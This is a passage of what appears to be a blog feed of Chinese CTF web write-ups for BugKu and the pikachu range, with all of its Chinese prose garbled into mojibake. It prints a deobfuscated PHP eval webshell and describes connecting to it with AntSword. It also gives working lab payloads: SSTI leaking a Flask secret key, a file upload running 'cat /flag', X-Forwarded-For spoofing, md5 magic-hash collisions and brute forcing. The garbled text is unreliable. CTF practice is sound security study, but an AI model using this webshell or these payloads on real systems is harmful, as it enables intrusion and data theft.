MCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è§£ç ï¼ˆæˆ‘æ˜¯ä¸€æ­¥æ­¥ç”¨base64è§£ç çš„ï¼Œä¸»è¦æ˜¯æ‰¾åˆ°evalé‡Œé¢çš„å†…å®¹ï¼Œæ³¨æ„æ˜¯æœ‰ä¸€æ¬¡è§£ç ä¼šå‡ºç°ä¸¤æ®µphpä»£ç ï¼Œç¬¬äºŒæ®µæ‰æ˜¯è¦çš„æºç )ï¼Œä¸‹é¢ä»£ç è¿è¡Œåå³å¯è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// define(&#x27;njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT&#x27;,pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn);</span></span><br><span class="line"><span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>=<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>.=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>=<span class="string">&quot;WtCxsqEuLNTSGRkVfZKHjUYPIognBiFhrbyOXacAelmwpJdzvQDMFbRYnLeWuGTKsNZvOpcgErtXBxCQljVfDwSmyqHikPMzdJaIoAhUXh9zqgiGRMfdp2fnqFaxaV9MqFYPcs5LvQPIAPd2kgJUq0pppe5opMGQN3vfa0NctMYzT1GNNrfKvF1uqrVxkZPhpyNATyVtv1Admz0cAsv2tFzxJV9AT1GrF3PbwsPIqyGdH2Pow2bacTn=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>(<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>*<span class="number">2</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="number">0</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸­å›½èšå‰‘è¿æ¥ï¼ˆä½¿ç”¨æ’ä»¶disable_functionsï¼‰ï¼Œè¿æ¥åå‘ç°åªèƒ½çœ‹htmlç›®å½•ä¸‹çš„ä¸œè¥¿ã€‚</p><p><img src="https://s2.loli.net/2022/04/25/ti2E6mdAYTXsfqB.png" alt="getshell1.png"></p><p>ç”¨èšå‰‘è¿æ¥ .antproxy.php</p><p><img src="https://s2.loli.net/2022/04/25/BQ28ELpHonSjU3O.png" alt="getshell2.png"></p><p>æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/25/jYuGEBn4b382MNH.png" alt="getshell3.png"></p><p><img src="https://s2.loli.net/2022/04/25/ucUkJHMwlmhVyXZ.png" alt="getshell4.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•1</title>
      <link href="/2022/04/24/BugKu-Web1/"/>
      <url>/2022/04/24/BugKu-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•1"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•1" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•1"></a>BugKu Web åˆ·é¢˜è®°å½•1</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p><p><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p></blockquote><h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12æŸ¥çœ‹æºç </p><p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p><p>è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p><h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>åˆ›å»º111.txtå¹¶è¾“å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ–‡ä»¶åä¸º111.jpgåä¸Šä¼ æ–‡ä»¶å³å¯å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p><h2 id="æ»‘ç¨½"><a href="#æ»‘ç¨½" class="headerlink" title="æ»‘ç¨½"></a>æ»‘ç¨½</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p><p>F12åï¼Œctrl+fæœç´¢flagå³å¯</p><p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>F12ï¼Œä¿®æ”¹é•¿åº¦é™åˆ¶ï¼Œéšåè¾“å…¥æ­£ç¡®è®¡ç®—ç»“æœå³å¯ã€‚</p><p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>ç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯ä¸èƒ½ä¸ºæ•°å­—ï¼Œç¬¬äºŒä¸ªæ¡ä»¶æ˜¯&#x3D;&#x3D;æ¯”è¾ƒï¼Œå’Œæ•´å‹æ¯”è¾ƒæ˜¯ä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´å‹ï¼Œâ€™1adminâ€™åœ¨æ¯”è¾ƒæ—¶å€™ä¼šå˜æˆ1</p><p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>æŸ¥çœ‹æºä»£ç </p><p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p><p>æ”¾åˆ°htmlä¸­æ˜¾ç¤º</p><p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p><h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>burp suiteæŠ“åŒ…</p><p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p><h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><p>å…³é”®åœ¨äºè¿™ä¸€å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure><p>æ•…ä¼ å…¥args&#x3D;GLOBALS,æœ€åä¼šè¾“å‡ºâ€‹GLOBALS,flagå°±åœ¨å…¶ä¸­</p><p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p><h2 id="å¤´ç­‰èˆ±"><a href="#å¤´ç­‰èˆ±" class="headerlink" title="å¤´ç­‰èˆ±"></a>å¤´ç­‰èˆ±</h2><p>æŠ“åŒ…æŸ¥çœ‹å“åº”åŒ…</p><p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p><h2 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h2><p>æç¤ºæœ‰æ— åé—¨ï¼Œç”¨å¾¡å‰‘æ‰«æä¸€ä¸‹å‘ç°shell.php</p><p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p><p>è¿›å…¥åå‘ç°éœ€è¦è¾“å…¥å¯†ç </p><p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p><p>ç”¨burpçˆ†ç ´è·å¾—å¯†ç </p><p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p><p>è¾“å…¥å¯†ç åå¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p><h2 id="æœ¬åœ°ç®¡ç†å‘˜"><a href="#æœ¬åœ°ç®¡ç†å‘˜" class="headerlink" title="æœ¬åœ°ç®¡ç†å‘˜"></a>æœ¬åœ°ç®¡ç†å‘˜</h2><p>F12æŸ¥çœ‹å‘ç°ç¼–ç </p><p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p><p>æ”¾è¿›base64ä¸­è§£å¯†å¾—åˆ°å¯†ç ï¼Œç”±äºæ˜¯ç®¡ç†å‘˜ï¼Œæ•…çŒœæµ‹è´¦æˆ·ä¸ºadmin</p><p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p><p>è¾“å…¥åå‘ç°ipè¢«ban</p><p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p><p>ä½¿ç”¨burpè¿›è¡Œipä¼ªé€ è·å–flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p><h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><p>F12æŸ¥çœ‹å¾—åˆ°ä»£ç </p><p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p><p>ç”¨ä»¥ä¸‹ä»£ç è§£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p><p>è¾“å…¥å¯†ç å³å¯å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>æ ¹æ®æç¤ºï¼ˆz?????ï¼‰çŒœæµ‹ä¸ºzå¼€å¤´çš„6ä½å¯†ç ï¼Œç›´æ¥ç”¨burpçˆ†ç ´ï¼ˆæ³¨æ„åŠ ä¸Šæ ‡è®°code: â€˜bugku10000â€™ï¼Œä¸ç„¶æ‰€æœ‰è¿”å›å­—æ®µéƒ½ç›¸åŒï¼‰</p><p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>ä½¿ç”¨æ‰«æå·¥å…·æ‰«æï¼ˆ<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>ï¼‰</p><p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p><p>è¾“å…¥&#x2F;index.php.bakåç¼€ä¸‹è½½å¾—åˆ°æºæ–‡ä»¶index.php.bak</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr è·å¾—URIä»&#x27;?&#x27;å¾€å(åŒ…æ‹¬&#x27;?&#x27;)çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr å»æ‰&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//æŠŠ$strä¸­çš„æ‰€æœ‰keyå»æ‰</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//æŠŠå­—ç¬¦ä¸²è§£æåˆ°å˜é‡é‡Œ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1å’Œkey2çš„md5å€¼ç›¸ç­‰ä½†äºŒè€…ä¸æ’ç­‰</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;å–å¾—flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p><p>ä»‹ç»ä¸€æ‰¹md5æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachué¶åœºåˆ·é¢˜è®°å½•</title>
      <link href="/2022/04/21/pikachu/"/>
      <url>/2022/04/21/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-pikachué¶åœºè®°å½•"><a href="#CTF-Web-pikachué¶åœºè®°å½•" class="headerlink" title="CTF Web pikachué¶åœºè®°å½•"></a>CTF Web pikachué¶åœºè®°å½•</h1><blockquote><p>ç®€å•è®°å½•ä¸‹pikachué¶åœºåˆ·é¢˜å†ç¨‹</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://www.bilibili.com/video/BV1Qh411D7mN?share_source=copy_web">å…¨ç¨‹è®²è§£è§†é¢‘</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachué¶åœºwp1</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/107880269?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165020809116780255213643%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165020809116780255213643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107880269.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu&spm=1018.2226.3001.4187">pikachué¶åœºwp2</a></p></blockquote><h2 id="é¶åœºç¯å¢ƒé…ç½®"><a href="#é¶åœºç¯å¢ƒé…ç½®" class="headerlink" title="é¶åœºç¯å¢ƒé…ç½®"></a>é¶åœºç¯å¢ƒé…ç½®</h2><blockquote><p>å¯ä»¥å‚ç…§æœ¬ç¯‡åšå®¢ï¼š<a href="https://www.webxlab.net/article/detail/OmAE5oMAar">https://www.webxlab.net/article/detail/OmAE5oMAar</a></p></blockquote><p>åˆå§‹ç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/UPZhWdKINOnD8V7.png" alt="brief_intro.png"></p><h2 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h2><p>ä½¿ç”¨burp suiteå³å¯</p><p>burpsuiteæ— æ³•æ‹¦æˆªæœ¬åœ°åŒ…ï¼š<a href="https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p>ä½¿ç”¨intruderæ¨¡å—å³å¯</p><h3 id="éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰"><a href="#éªŒè¯ç ç»•è¿‡ï¼ˆon-serverï¼‰" class="headerlink" title="éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰"></a>éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰</h3><p>éªŒè¯ç 